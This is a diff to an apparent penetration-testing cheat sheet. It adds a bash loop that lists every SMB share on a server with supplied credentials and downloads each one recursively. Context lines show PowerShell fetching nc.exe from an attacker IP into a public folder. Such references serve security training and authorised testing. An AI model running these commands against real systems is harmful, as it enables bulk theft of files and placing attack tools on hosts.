@@ -1977,6 +1977,20 @@ PS C:\> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
 PS C:\> Invoke-WebRequest http://<IP address>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
 ```
 
+- SMBClient Bulk Download Script
+
+```
+SERVER="<IP address>"
+USER="<Domain>\\<username>"
+PASS="<password>"
+
+for share in $(smbclient -L $SERVER -U $USER%$PASS 2>/dev/null | awk '/Disk/ {print $1}'); do
+    echo "[+] Downloading $share ..."
+    mkdir -p "$share"
+    smbclient //$SERVER/$share -U $USER%$PASS -c "recurse ON; prompt OFF; lcd \"$share\"; mget *"
+done
+```
+
 #9. - Restricted Shell Escapes
 -----------------------------------------
 
